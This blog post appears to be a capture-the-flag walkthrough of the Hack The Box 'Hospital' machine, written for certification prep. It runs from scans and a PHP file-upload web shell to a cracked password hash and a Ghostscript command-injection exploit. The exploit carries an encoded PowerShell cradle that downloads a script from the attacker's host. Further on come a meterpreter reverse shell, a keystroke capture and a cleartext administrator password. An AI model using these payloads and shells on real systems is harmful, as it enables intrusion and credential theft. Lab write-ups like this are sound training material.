---
title: "HTB Hospital"
date: 2026-05-20 11:26 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, WSL]
image: /assets/img/posts/hospital/hospital.png
---

## Machine Information

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.229.189 --min-rate 1000 -nv
```
```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6404/tcp  open  boe-filesvr
6406/tcp  open  boe-processsvr
6407/tcp  open  boe-resssvr1
6409/tcp  open  boe-resssvr3
6613/tcp  open  unknown
6629/tcp  open  nexgen-aux
8080/tcp  open  http-proxy
9389/tcp  open  adws
34032/tcp open  unknown
```

- NSE Scripts & Version

```
nmap -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6629,8080,9389,34032 10.129.229.189 --min-rate 1000 -nv
```
```
PORT      STATE SERVICE           VERSION                                                                                                                    
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)                                                               
| ssh-hostkey:                                                                                                                                               
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)                                                                                              
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)                                                                                            
53/tcp    open  domain            Simple DNS Plus                                                                                                            
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-05-20 17:30:25Z)                                                             
135/tcp   open  msrpc             Microsoft Windows RPC                                                                                                      
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn                                                                                              
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)                              
| ssl-cert: Subject: commonName=DC                                                                                                                           
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb                                                                                                      
| Issuer: commonName=DC                                                                                                                                      
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2023-09-06T10:49:03                                                                                                                      
| Not valid after:  2028-09-06T10:49:03                                                                                                                      
| MD5:     04b1 adfe 746a 788e 36c0 802a bdf3 3119                                                                                                           
| SHA-1:   17e5 8592 278f 4e8f 8ce1 554c 3550 9c02 2825 91e3
|_SHA-256: 1931 f7e1 41f1 a2b9 95fb 9739 6037 05ba d0f8 6683 7053 9b47 1863 4243 e911 cbba
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:     04b1 adfe 746a 788e 36c0 802a bdf3 3119
| SHA-1:   17e5 8592 278f 4e8f 8ce1 554c 3550 9c02 2825 91e3
|_SHA-256: 1931 f7e1 41f1 a2b9 95fb 9739 6037 05ba d0f8 6683 7053 9b47 1863 4243 e911 cbba                                                     06:32 [60/278]
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:     04b1 adfe 746a 788e 36c0 802a bdf3 3119
| SHA-1:   17e5 8592 278f 4e8f 8ce1 554c 3550 9c02 2825 91e3
|_SHA-256: 1931 f7e1 41f1 a2b9 95fb 9739 6037 05ba d0f8 6683 7053 9b47 1863 4243 e911 cbba
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:     04b1 adfe 746a 788e 36c0 802a bdf3 3119
| SHA-1:   17e5 8592 278f 4e8f 8ce1 554c 3550 9c02 2825 91e3
|_SHA-256: 1931 f7e1 41f1 a2b9 95fb 9739 6037 05ba d0f8 6683 7053 9b47 1863 4243 e911 cbba
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-19T17:21:03
| Not valid after:  2026-11-18T17:21:03
| MD5:     9d8e 9d32 f597 5392 4ca8 29ad 2d52 6427
| SHA-1:   f0b7 9700 3851 9e6b e2d4 c56a b668 0178 b51c 60db
|_SHA-256: d238 b682 1a99 608e a2d1 623b 88f4 8d91 25d4 d621 33a4 887b d68e 0912 824f 0d7c
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-20T17:31:26+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6613/tcp  open  msrpc             Microsoft Windows RPC
6629/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)                                                                                                                 
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf            .NET Message Framing
34032/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2026-05-20T17:31:24
|_  start_date: N/A
```

### Configuration

- /etc/hosts

```bash
sudo nxc smb 10.129.229.189 --generate-hosts-file /etc/hosts
```

- /etc/krb5.conf

```bash
sudo nxc smb DC.hospital.htb --generate-krb5-file /etc/krb5.conf
```

- time

```bash
sudo ntpdate -u DC.hospital.htb
```

## Hospital.htb:8080

### Fuzzing

```
ffuf -u 'http://hospital.htb:8080/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -fs 279
```

```
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 125ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 124ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 119ms]
uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 136ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 137ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 133ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 129ms]
```

### File Upload

- POST FILE

![upload](/assets/img/posts/hospital/upload.png)

- GET FILE

![get_upload](/assets/img/posts/hospital/getup.png)

- Disabled Functions

![disabled_func](/assets/img/posts/hospital/disfunc.png)

- [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

```php
function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}
```
- DONE

![done1](/assets/img/posts/hospital/done.png)

```
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
```
cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```

[CVE-2023-32692](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)

```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

```
hashcat -a 0 hash.txt rockyou.txt -d 1 -O --user
```

```
drwilliams:qwe123!@#
```

## Hospital.htb:443

![drbrowny](/assets/img/posts/hospital/brown.png)

[Ghostscript-Command-Injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)

```
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.186/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

```
python3 CVE_2023_36664_exploit.py --generate --payload "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAOAA2AC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA" --filename visual --extension eps
```

![shell](/assets/img/posts/hospital/shell.png)

### shell as drbrown
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.186 LPORT=9002 -f exe -o rev.exe
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9002; run"
iwr -Uri http://10.10.14.186/rev.exe -OutFile rev.exe
```

```
meterpreter > migrate 6692
[*] Migrating from 32 to 6692...
[*] Migration completed successfully.
meterpreter > screenshot                                                                                                                                     
Screenshot saved to: /home/kali/Desktop/AiO/CPTS-PREP/Hospital/vbraFKmo.jpeg                                                                                 
meterpreter > keyscan_start                                                                                                                                  
Starting the keystroke sniffer ...                                                                                                                           
meterpreter > keyscan_dump                                                                                                                                   
Dumping captured keystrokes...                                                                                                                               
Administrator..........
meterpreter > getuid
Server username: HOSPITAL\drbrown
meterpreter > getpid
Current pid: 6692
```

### exec as Administrator

```
nxc smb DC.hospital.htb -u administrator -p 'Th3B3stH0sp1t4l9786!' -x 'type C:\Users\Administrator\Desktop\root.txt'
```



